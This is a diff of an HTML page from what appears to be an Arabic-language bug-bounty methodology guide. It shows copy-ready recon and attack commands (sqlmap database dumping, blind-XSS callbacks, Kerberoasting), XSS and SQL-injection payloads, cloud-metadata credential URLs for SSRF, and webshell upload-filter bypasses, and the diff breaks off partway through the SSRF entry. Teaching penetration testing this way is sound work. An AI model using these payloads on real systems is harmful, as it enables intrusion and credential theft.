+      <div class="meth-content-view" id="meth-content-p2" style="display: none; --tool-color: #ffb020;">
         <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🎛️</span> Phase 8: Parameter Discovery</h2>
-          <p class="hero-tagline">اكتشاف الباراميترات المخفية وغير الموثقة على روابط الويب</p>
+          <h2 class="hero-title"><span class="hero-icon">🖥️</span> 3. Technology Detection</h2>
+          <p class="hero-tagline">كشف وتحديد اللغات والتقنيات المستخدمة في إدارة الخادم</p>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>🎯 Arjun Parameter Fuzzer</h3></div>
-          <p>البحث عن مدخلات لم تدرج في الهيكل الخارجي مثل <code>?debug=true</code> أو <code>?admin=1</code>:</p>
+          <div class="card-header"><h3>⚙️ Profiling target technology stack</h3></div>
+          <p>معرفة أن السيرفر يعمل بـ (PHP, Nodejs, Rails) أو أن لوحة التحكم هي (Drupal, Webmin) يسهل إيجاد ثغرات محددة:</p>
           <div class="cmd-ui-box">
-            <div class="cmd-ui-top">arjun -u https://target.com/api/v1/user -m GET -oJ discovered_params.json</div>
+            <div class="cmd-ui-top">whatweb https://target.com</div>
             <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('arjun -u https://target.com/api/v1/user -m GET -oJ discovered_params.json', this)">📋 Copy</button>
+              <button class="cmd-btn" onclick="copyText('whatweb https://target.com', this)">📋 Copy</button>
+              <button class="cmd-btn run-btn" onclick="triggerTerminalSim('whatweb https://target.com')">▶ Run Simulator</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Phase 3: Crawling & Spidering -->
+      <div class="meth-content-view" id="meth-content-p3" style="display: none; --tool-color: #ff00d4;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">🕷️</span> 4. Web Crawling & Spidering</h2>
+          <p class="hero-tagline">استخراج كافة الروابط المتاحة للتطبيق والـ endpoints من كود الصفحة</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🕷️ Crawling Tools Spec</h3></div>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top">katana -u https://target.com -jc -kf -o katana_endpoints.txt</div>
+            <div class="cmd-ui-bottom">
+              <button class="cmd-btn" onclick="copyText('katana -u https://target.com -jc -kf -o katana_endpoints.txt', this)">📋 Copy</button>
+              <button class="cmd-btn run-btn" onclick="triggerTerminalSim('katana -u target.com')">▶ Run Simulator</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Phase 4: JavaScript Recon -->
+      <div class="meth-content-view" id="meth-content-p4" style="display: none; --tool-color: #00e5ff;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">📜</span> 5. JavaScript Recon Workflow</h2>
+          <p class="hero-tagline">أخطر مسارات الاستطلاع للبحث عن المسارات السرية والمفاتيح داخل ملفات الـ JS</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>📦 JS Hunting Steps</h3></div>
+          <div class="workflow-tree">
+            <span class="tree-branch">JavaScript Recon</span><br>
+            ├── Collect JS Files (Katana / GAU)<br>
+            ├── Extract Endpoints (LinkFinder)<br>
+            └── Extract Secrets (SecretFinder / GitLeaks)
+          </div>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>Step 1 — Collect JS Files</h3></div>
+          <p>سحب ملفات الجافا سكربت النشطة والأرشيفية للهدف:</p>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top">katana -u https://target.com -jc | grep -E "\.js$" > js_files.txt</div>
+            <div class="cmd-ui-bottom">
+              <button class="cmd-btn" onclick="copyText('katana -u https://target.com -jc | grep -E &quot;\\.js$&quot; > js_files.txt', this)">📋 Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>Step 2 — Extract Endpoints (LinkFinder)</h3></div>
+          <p>تحليل ملف الـ JS واستخراج مسارات الـ API والـ Endpoints المكتوبة بداخله:</p>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top">python3 linkfinder.py -i https://target.com/assets/main.js -o cli</div>
+            <div class="cmd-ui-bottom">
+              <button class="cmd-btn" onclick="copyText('python3 linkfinder.py -i https://target.com/assets/main.js -o cli', this)">📋 Copy</button>
+              <button class="cmd-btn run-btn" onclick="triggerTerminalSim('python3 linkfinder.py -i target.js')">▶ Run Simulator</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>Step 3 — Secrets Classification Matrix</h3></div>
+          <p>الأسرار والمفاتيح الحساسة التي نكشفها بملفات الجافا سكربت:</p>
+          <table class="interactive-table">
+            <thead>
+              <tr>
+                <th>نوع التسريب (Secret Type)</th>
+                <th>أمثلة وتأثيرات</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong class="text-neon-cyan">API Keys</strong></td>
+                <td>خرائط Google, Stripe API, Twilio SID (دفع فواتير أو إساءة استخدام)</td>
+              </tr>
+              <tr>
+                <td><strong class="text-neon-cyan">AWS Creds</strong></td>
+                <td>AWS Access Key, Secret Access Key (تسريب البنية التحتية السحابية)</td>
+              </tr>
+              <tr>
+                <td><strong class="text-neon-cyan">Internal Domains</strong></td>
+                <td><code>staging.target.local</code>, <code>dev.target.internal</code></td>
+              </tr>
+              <tr>
+                <td><strong class="text-neon-cyan">Firebase Config</strong></td>
+                <td>تسريب مفتاح قاعدة بيانات Firebase المفتوحة للعامة لقراءتها</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Phase 5: Parameters Discovery -->
+      <div class="meth-content-view" id="meth-content-p5" style="display: none; --tool-color: #9b59ff;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">🎛️</span> 6. Parameter Discovery</h2>
+          <p class="hero-tagline">تخمين المعاملات المخفية على الروابط والـ endpoints</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🛠️ Discovering hidden query params</h3></div>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top">arjun -u https://target.com/api/v1/user -m GET</div>
+            <div class="cmd-ui-bottom">
+              <button class="cmd-btn" onclick="copyText('arjun -u https://target.com/api/v1/user -m GET', this)">📋 Copy</button>
               <button class="cmd-btn run-btn" onclick="triggerTerminalSim('arjun -u https://target.com/api')">▶ Run Simulator</button>
             </div>
           </div>
         </div>
       </div>
 
-      <!-- Phase 9: API Hacking -->
-      <div class="meth-content-view" id="meth-content-p9" style="display: none; --tool-color: #bf80ff;">
+      <!-- Phase 6: Directory Discovery -->
+      <div class="meth-content-view" id="meth-content-p6" style="display: none; --tool-color: #00ff66;">
         <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🧬</span> Phase 9: API Hacking</h2>
-          <p class="hero-tagline">تحليل واجهات برمجة التطبيقات (APIs) وفحص ثغرات تخطي التوثيق والـ endpoints</p>
+          <h2 class="hero-title"><span class="hero-icon">📂</span> 7. Directory Discovery Workflow</h2>
+          <p class="hero-tagline">منهجية التخمين الفائقة للمجلدات والملفات والمسارات المخفية</p>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>🛠️ Kiterunner: API Discovery Tool</h3></div>
-          <p>تخمين مسارات الـ API بالاعتماد على قواعد بيانات الكلمات البرمجية المصممة للـ REST/GraphQL APIs:</p>
+          <div class="card-header"><h3>📦 Directory discovery tools</h3></div>
+          <table class="interactive-table">
+            <thead>
+              <tr>
+                <th>الأداة</th>
+                <th>أفضل استخدام لـ</th>
+                <th>الميزة الرئيسية</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong class="text-primary">FFUF</strong></td>
+                <td>السرعة الفائقة وتخصيص الطلبات</td>
+                <td>بسيط وسرعة معالجة عالية جداً</td>
+              </tr>
+              <tr>
+                <td><strong class="text-primary">Feroxbuster</strong></td>
+                <td>الفحص المتداخل (Recursion)</td>
+                <td>يقوم بفحص المجلدات التي يتم اكتشافها تلقائياً</td>
+              </tr>
+              <tr>
+                <td><strong class="text-primary">Wfuzz</strong></td>
+                <td>التحكم الكامل بالبارامترات والمدخلات</td>
+                <td>يدعم فلاتر متقدمة برمجياً</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🛠️ Execution Workflow</h3></div>
+          
+          <h4>1. Basic scanning with FFUF:</h4>
           <div class="cmd-ui-box">
-            <div class="cmd-ui-top">kr scan https://target.com/api -w /usr/share/wordlists/kiterunner/routes-large.kite</div>
+            <div class="cmd-ui-top">ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fc 404</div>
             <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('kr scan https://target.com/api -w /usr/share/wordlists/kiterunner/routes-large.kite', this)">📋 Copy</button>
+              <button class="cmd-btn" onclick="copyText('ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fc 404', this)">📋 Copy</button>
+              <button class="cmd-btn run-btn" onclick="triggerTerminalSim('ffuf -u target.com/FUZZ')">▶ Run Simulator</button>
+            </div>
+          </div>
+
+          <h4>2. Recursive scanning with Feroxbuster:</h4>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top">feroxbuster -u https://target.com -w wordlist.txt -x php,html,txt,json</div>
+            <div class="cmd-ui-bottom">
+              <button class="cmd-btn" onclick="copyText('feroxbuster -u https://target.com -w wordlist.txt -x php,html,txt,json', this)">📋 Copy</button>
+              <button class="cmd-btn run-btn" onclick="triggerTerminalSim('feroxbuster -u https://target.com')">▶ Run Simulator</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>📂 Sensitive Files Discovery Matrix</h3></div>
+          <p>أهم الملفات الحساسة التي نكشفها بملفات صيد المجلدات والخطورة الكامنة فيها:</p>
+          <table class="interactive-table">
+            <thead>
+              <tr>
+                <th>الملف المكتشف</th>
+                <th>مستوى الخطورة</th>
+                <th>أهمية وتأثير الاكتشاف</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>.git/</code></td>
+                <td><span class="text-neon-red">Critical</span></td>
+                <td>سحب الشيفرة البرمجية الكاملة للموقع وتاريخ التعديل</td>
+              </tr>
+              <tr>
+                <td><code>.env</code></td>
+                <td><span class="text-neon-red">Critical</span></td>
+                <td>مفاتيح الربط وكلمات مرور قاعدة البيانات والأسرار البرمجية</td>
+              </tr>
+              <tr>
+                <td><code>backup.zip / db.sql</code></td>
+                <td><span class="text-neon-red">Critical</span></td>
+                <td>تحميل قاعدة البيانات بالكامل أو نسخ احتياطية للموقع</td>
+              </tr>
+              <tr>
+                <td><code>swagger.json / api-docs</code></td>
+                <td><span class="text-neon-cyan">High</span></td>
+                <td>خرائط APIs وتفاصيل هيكل المدخلات لاختبارها مباشرة</td>
+              </tr>
+              <tr>
+                <td><code>phpinfo.php</code></td>
+                <td><span class="text-secondary">Medium</span></td>
+                <td>تسريب معلومات تكوين خادم الويب والمسارات ومحركات الحماية</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Phase 7: XSS Workflow -->
+      <div class="meth-content-view" id="meth-content-p7" style="display: none; --tool-color: #bf80ff;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">🌐</span> 8. Cross Site Scripting (XSS) Workflow</h2>
+          <p class="hero-tagline">منهجية الفحص والتعرف على سياقات الحقن وكتابة الحمولات المناسبة</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>📋 Context Analysis (مصفوفة سياقات الحقن)</h3></div>
+          <p>الحقن الناجح يعتمد بالكامل على السياق البرمجي الذي يظهر فيه المدخل:</p>
+          <table class="interactive-table">
+            <thead>
+              <tr>
+                <th>سياق الانعكاس (Context)</th>
+                <th>أمثلة للحمولات (PoC Payload)</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>HTML Tags</strong></td>
+                <td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code> أو <code>&lt;img src=x onerror=alert(1)&gt;</code></td>
+              </tr>
+              <tr>
+                <td><strong>HTML Attributes</strong></td>
+                <td><code>" onmouseover="alert(1)</code> or <code>" autofocus onerror="alert(1)</code></td>
+              </tr>
+              <tr>
+                <td><strong>Javascript Block</strong></td>
+                <td><code>'; alert(1); //</code> or <code>-alert(1)-</code></td>
+              </tr>
+              <tr>
+                <td><strong>URL Schemes</strong></td>
+                <td><code>javascript:alert(1)</code> (في سياق روابط a href)</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🛠️ Auto Scanning with Dalfox</h3></div>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top">dalfox url https://target.com/search?q=test -b https://your-blind-xss.xss.ht</div>
+            <div class="cmd-ui-bottom">
+              <button class="cmd-btn" onclick="copyText('dalfox url https://target.com/search?q=test -b https://your-blind-xss.xss.ht', this)">📋 Copy</button>
+              <button class="cmd-btn run-btn" onclick="triggerTerminalSim('dalfox url https://target.com/search?q=test')">▶ Run Simulator</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Phase 8: SQLi Workflow -->
+      <div class="meth-content-view" id="meth-content-p8" style="display: none; --tool-color: #ef4444;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">💉</span> 9. SQL Injection (SQLi) Workflow</h2>
+          <p class="hero-tagline">منهجية كشف واستغلال ثغرات قواعد البيانات</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>📋 SQLi Detection Roadmap</h3></div>
+          <div class="workflow-tree">
+            <span class="tree-branch">SQLi Scan</span><br>
+            ├── Error-Based Detection (Injecting ' or ")<br>
+            ├── Boolean-Based Testing (Injecting AND 1=1 / AND 1=2)<br>
+            ├── Time-Based Blind Fuzzing (Injecting sleep(5))<br>
+            └── Database Dumping (SQLMap / Ghauri)
+          </div>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🛠️ SQLMap Automated Command</h3></div>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top">sqlmap -u "https://target.com/item.php?id=1" --dbs --batch --random-agent</div>
+            <div class="cmd-ui-bottom">
+              <button class="cmd-btn" onclick="copyText('sqlmap -u &quot;https://target.com/item.php?id=1&quot; --dbs --batch --random-agent', this)">📋 Copy</button>
+              <button class="cmd-btn run-btn" onclick="triggerTerminalSim('sqlmap -u target.com/item.php?id=1')">▶ Run Simulator</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Phase 9: SSRF Workflow -->
+      <div class="meth-content-view" id="meth-content-p9" style="display: none; --tool-color: #0284c7;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">📡</span> 10. Server Side Request Forgery (SSRF)</h2>
+          <p class="hero-tagline">فحص المدخلات البرمجية التي تطلب روابط خارجية واستغلالها</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>☁️ Cloud Metadata IPs (SSRF targets)</h3></div>
+          <p>أهم الأهداف التي يجب محاولة حقنها لسحب مفاتيح الربط السحابية المشفرة:</p>
+          <table class="interactive-table">
+            <thead>
+              <tr>
+                <th>البيئة السحابية (Provider)</th>
+                <th>رابط الاستدعاء (Metadata Endpoint)</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>AWS (Amazon)</strong></td>
+                <td><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></td>
+              </tr>
+              <tr>
+                <td><strong>GCP (Google Cloud)</strong></td>
+                <td><code>http://metadata.google.internal/computeMetadata/v1/instance/disks/</code> (Requires Headers)</td>
+              </tr>
+              <tr>
+                <td><strong>Azure (Microsoft)</strong></td>
+                <td><code>http://169.254.169.254/metadata/instance?api-version=2021-02-01</code> (Requires Headers)</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Phase 10: IDOR Testing -->
+      <div class="meth-content-view" id="meth-content-p10" style="display: none; --tool-color: #10b981;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">🔑</span> 11. IDOR Testing</h2>
+          <p class="hero-tagline">تخطي الصلاحيات والوصول لملفات فواتير وبيانات مستخدمين آخرين</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>💡 Testing Strategy</h3></div>
+          <blockquote class="mindset-quote">"قم بالتسجيل بحسابين مختلفين (A & B). استخرج طلب حساب A من Burp Suite، وقم بتعديل الـ ID أو اسم المستخدم إلى حساب B. إذا تم تنفيذ الطلب، فهناك ثغرة IDOR مؤكدة."</blockquote>
+        </div>
+      </div>
+
+      <!-- Phase 11: File Upload Exploits -->
+      <div class="meth-content-view" id="meth-content-p11" style="display: none; --tool-color: #f59e0b;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">📤</span> 12. File Upload Exploits</h2>
+          <p class="hero-tagline">رفع ملفات خبيثة (Webshells) لتنفيذ الأوامر على خادم الهدف</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🛠️ Bypassing Extensions Filters</h3></div>
+          <p>طرق تخطي حظر رفع ملفات الـ PHP:</p>
+          <ul class="t-check-list">
+            <li>✔ <strong>Alternative Extensions:</strong> رفع بصيغ بديلة مثل <code>.phtml</code> or <code>.php5</code> or <code>.phar</code>.</li>
+            <li>✔ <strong>Double Extensions:</strong> رفع باسم مثل <code>image.png.php</code>.</li>
+            <li>✔ <strong>MIME-Type bypass:</strong> تعديل الـ Content-Type في الطلب إلى <code>image/jpeg</code> بدلاً من <code>application/x-php</code>.</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- Phase 12: Race Conditions -->
+      <div class="meth-content-view" id="meth-content-p12" style="display: none; --tool-color: #f43f5e;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">⚡</span> 13. Race Conditions</h2>
+          <p class="hero-tagline">استغلال العمليات المتزامنة في معالجة طلبات الويب لتخطي حدود الاستخدام</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>⚙️ Multi-request attack scenario</h3></div>
+          <p>إرسال طلبات متعددة لعمليات خصم الرصيد أو طلب الأكواد في أجزاء من الميكروثانية باستخدام Burp Suite Turbo Intruder لتكرار الكوبونات أو سحب رصيد مجاني.</p>
+        </div>
+      </div>
+
+      <!-- Phase 13: OAuth & Sessions -->
+      <div class="meth-content-view" id="meth-content-p13" style="display: none; --tool-color: #8b5cf6;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">🔐</span> 14. OAuth & Session Hijacking</h2>
+          <p class="hero-tagline">فحص آليات تسجيل الدخول الموحد وثغرات تخطي التحقق</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🛡️ OAuth redirects issues</h3></div>
+          <p>التعديل على بارامتر <code>redirect_uri</code> لإرسال رمز التفويض (Authorization Code) إلى موقع خارجي يملكه المهاجم وسرقة حساب المستخدم.</p>
+        </div>
+      </div>
+
+      <!-- Phase 14: JWT Hacking -->
+      <div class="meth-content-view" id="meth-content-p14" style="display: none; --tool-color: #d946ef;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">🎫</span> 15. JWT Hacking Workflow</h2>
+          <p class="hero-tagline">تخمين التواقيع وتخطي حماية رموز التوثيق المعتمدة على JSON Web Tokens</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🛠️ jwt_tool usage</h3></div>
+          <p>أداة سطر الأوامر للتحليل واكتشاف ثغرات الـ signature bypass والتواقيع الضعيفة:</p>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top">python3 jwt_tool.py <TOKEN> -X a</div>
+            <div class="cmd-ui-bottom">
+              <button class="cmd-btn" onclick="copyText('python3 jwt_tool.py <TOKEN> -X a', this)">📋 Copy</button>
+              <button class="cmd-btn run-btn" onclick="triggerTerminalSim('python3 jwt_tool.py token')">▶ Run Simulator</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Phase 15: Cloud Security -->
+      <div class="meth-content-view" id="meth-content-p15" style="display: none; --tool-color: #0ea5e9;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">☁️</span> 16. Cloud Security OSINT</h2>
+          <p class="hero-tagline">استكشاف أخطاء التكوين في خوادم AWS و Azure و GCP</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>📂 AWS Bucket access</h3></div>
+          <p>التحقق من الصلاحيات والوصول للملفات المفتوحة بشكل غير آمن:</p>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top">aws s3 ls s3://target-bucket/ --no-sign-request</div>
+            <div class="cmd-ui-bottom">
+              <button class="cmd-btn" onclick="copyText('aws s3 ls s3://target-bucket/ --no-sign-request', this)">📋 Copy</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Phase 16: API Testing Workflow -->
+      <div class="meth-content-view" id="meth-content-p16" style="display: none; --tool-color: #14b8a6;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">🧬</span> 17. API Testing Workflow</h2>
+          <p class="hero-tagline">منهجية فحص واكتشاف واجهات برمجية التطبيقات (APIs)</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>📦 API discovery with Kiterunner</h3></div>
+          <p>تخمين مسارات الـ API بالاعتماد على Routes مصممة خصيصاً للـ APIs:</p>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top">kr scan https://target.com/api -w /usr/share/wordlists/kiterunner/routes.kite</div>
+            <div class="cmd-ui-bottom">
+              <button class="cmd-btn" onclick="copyText('kr scan https://target.com/api -w /usr/share/wordlists/kiterunner/routes.kite', this)">📋 Copy</button>
               <button class="cmd-btn run-btn" onclick="triggerTerminalSim('kiterunner -u target.com/api')">▶ Run Simulator</button>
             </div>
           </div>
         </div>
       </div>
 
-      <!-- Phase 10: Auth & JWTs -->
-      <div class="meth-content-view" id="meth-content-p10" style="display: none; --tool-color: #ef4444;">
+      <!-- Phase 17: Automation Pipelines -->
+      <div class="meth-content-view" id="meth-content-p17" style="display: none; --tool-color: #10b981;">
         <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🔑</span> Phase 10: Authentication & JWT Testing</h2>
-          <p class="hero-tagline">فحص آليات التوثيق وتخطي التحقق الثنائي (MFA) وثغرات الـ JSON Web Tokens</p>
+          <h2 class="hero-title"><span class="hero-icon">⚙️</span> 18. Automation Pipelines</h2>
+          <p class="hero-tagline">منهجية دمج الأدوات في خطوط أنابيب برمجية تلقائية بالكامل</p>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>🛠️ JWT Signature Bypass Cheat Sheet</h3></div>
-          <p>أهم الهجمات على الـ JWT:</p>
-          <ul class="t-check-list">
-            <li>✔ <strong>None Algorithm:</strong> تعديل قيمة الـ Header إلى <code>"alg": "none"</code> وإزالة التوقيع.</li>
-            <li>✔ <strong>Key Confusion (HS256 vs RS256):</strong> استغلال استخدام نفس المفتاح العام لـ RS256 لتوقيع التوكن بـ HS256 متماثل.</li>
-            <li>✔ <strong>Weak Secret Cracking:</strong> تخمين التوقيع محلياً باستخدام Hashcat أو jwt_tool.</li>
-          </ul>
-        </div>
-      </div>
-
-      <!-- Phase 11: Cloud OSINT -->
-      <div class="meth-content-view" id="meth-content-p11" style="display: none; --tool-color: #0ea5e9;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">☁️</span> Phase 11: Cloud Security & OSINT</h2>
-          <p class="hero-tagline">اكتشاف تسريبات الخوادم السحابية (AWS S3 Buckets, Azure Blobs, GCP Buckets)</p>
-        </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3>🗄️ AWS S3 Bucket Hunting</h3></div>
-          <p>تخمين أسماء وحدات التخزين السحابية لمعرفة ما إذا كانت تسمح بالقراءة أو الكتابة المفتوحة:</p>
+          <div class="card-header"><h3>🔗 Simple vs Advanced Pipelines</h3></div>
+          
+          <h4>1. Simple Automation chain:</h4>
           <div class="cmd-ui-box">
-            <div class="cmd-ui-top">aws s3 ls s3://target-assets-bucket/ --no-sign-request</div>
+            <div class="cmd-ui-top">subfinder -d target.com -silent | httpx -silent | nuclei -t cves/</div>
             <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('aws s3 ls s3://target-assets-bucket/ --no-sign-request', this)">📋 Copy</button>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <!-- Phase 12: Mobile Testing -->
-      <div class="meth-content-view" id="meth-content-p12" style="display: none; --tool-color: #10b981;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">📱</span> Phase 12: Mobile Pentesting</h2>
-          <p class="hero-tagline">تحليل تطبيقات الهاتف (Android / iOS) واستخراج المسارات الحساسة وعمليات Hooking</p>
-        </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3>⚙️ Frida Runtime Hooking</h3></div>
-          <p>تخطي نظام الـ SSL Pinning لقراءة حركة الـ API الخاصة بتطبيق الهاتف المحمول عبر Burp Suite:</p>
-          <div class="cmd-ui-box">
-            <div class="cmd-ui-top">frida -U -f com.target.app -l bypass-ssl.js --no-pause</div>
-            <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('frida -U -f com.target.app -l bypass-ssl.js --no-pause', this)">📋 Copy</button>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <!-- Phase 13: Active Directory -->
-      <div class="meth-content-view" id="meth-content-p13" style="display: none; --tool-color: #f59e0b;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🏰</span> Phase 13: Active Directory Domain Hacking</h2>
-          <p class="hero-tagline">فحص واختراق شبكات الـ Active Directory والـ domain controllers</p>
-        </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3>📡 Kerberoasting with Impacket</h3></div>
-          <p>استخراج صلاحيات مستخدمي الـ Domain عبر طلب تذاكر الخدمة (TGS) وفك تشفيرها محلياً:</p>
-          <div class="cmd-ui-box">
-            <div class="cmd-ui-top">impacket-GetUserSPNs -request -dc-ip 10.10.10.100 domain.local/user:password</div>
-            <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('impacket-GetUserSPNs -request -dc-ip 10.10.10.100 domain.local/user:password', this)">📋 Copy</button>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <!-- Phase 14: Bug Encyclopedia -->
-      <div class="meth-content-view" id="meth-content-p14" style="display: none; --tool-color: #bf80ff;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">💀</span> Phase 14: Bug Encyclopedia</h2>
-          <p class="hero-tagline">موسوعة برمجية لأخطر الثغرات الأمنية الشائعة مع الحمولات والحلول المقترحة</p>
-        </div>
-
-        <div class="vuln-tabs-container">
-          <div class="vuln-tab active" onclick="switchVulnTab('xss')">XSS</div>
-          <div class="vuln-tab" onclick="switchVulnTab('sqli')">SQL Injection</div>
-          <div class="vuln-tab" onclick="switchVulnTab('ssrf')">SSRF</div>
-          <div class="vuln-tab" onclick="switchVulnTab('idor')">IDOR</div>
-          <div class="vuln-tab" onclick="switchVulnTab('rce')">RCE</div>
-        </div>
-
-        <!-- Vulnerability Content Panes -->
-        <div id="vuln-xss" class="vuln-pane active">
-          <div class="cyber-card border-purple">
-            <h3>🌐 Cross-Site Scripting (XSS)</h3>
-            <p><strong>Description:</strong> حقن أكواد جافا سكربت خبيثة في متصفح المستخدم عبر مدخلات لا يتم فحصها بشكل صحيح.</p>
-            
-            <h4>🚀 Common Payloads:</h4>
-            <div class="cmd-ui-box">
-              <div class="cmd-ui-top">&lt;script&gt;alert(document.cookie)&lt;/script&gt;
-&lt;img src=x onerror=alert(1)&gt;
-javascript:alert(1)</div>
-              <div class="cmd-ui-bottom">
-                <button class="cmd-btn" onclick="copyText('<script>alert(document.cookie)</script>', this)">📋 Copy</button>
-              </div>
-            </div>
-            
-            <h4>🛡️ Mitigation:</h4>
-            <p>تطبيق الـ HTML entity encoding الصارم، وتفعيل الـ Content Security Policy (CSP).</p>
-          </div>
-        </div>
-
-        <div id="vuln-sqli" class="vuln-pane">
-          <div class="cyber-card border-purple">
-            <h3>💉 SQL Injection</h3>
-            <p><strong>Description:</strong> إرسال أوامر SQL خبيثة لقاعدة البيانات عبر مدخلات الويب للوصول لمعلومات سرية أو تعديلها.</p>
-            
-            <h4>🚀 Common Payloads:</h4>
-            <div class="cmd-ui-box">
-              <div class="cmd-ui-top">' OR 1=1 --
-' UNION SELECT username, password FROM users --
-admin' --</div>
-              <div class="cmd-ui-bottom">
-                <button class="cmd-btn" onclick="copyText('\' OR 1=1 --', this)">📋 Copy</button>
-              </div>
-            </div>
-            
-            <h4>🛡️ Mitigation:</h4>
-            <p>استخدام الـ Parameterized Queries (Prepared Statements) ومنع الاستعلام المباشر عبر تكوين سلاسل النصوص.</p>
-          </div>
-        </div>
-
-        <div id="vuln-ssrf" class="vuln-pane">
-          <div class="cyber-card border-purple">
-            <h3>📡 Server Side Request Forgery (SSRF)</h3>
-            <p><strong>Description:</strong> إجبار سيرفر الويب على إرسال طلبات لصالح المهاجم إلى خدمات داخلية غير مصرح بالوصول إليها من الخارج.</p>
-            
-            <h4>🚀 Common Payloads:</h4>
-            <div class="cmd-ui-box">
-              <div class="cmd-ui-top">http://127.0.0.1:80/admin
-http://169.254.169.254/latest/meta-data/ (AWS Metadata)</div>
-              <div class="cmd-ui-bottom">
-                <button class="cmd-btn" onclick="copyText('http://169.254.169.254/latest/meta-data/', this)">📋 Copy</button>
-              </div>
-            </div>
-            
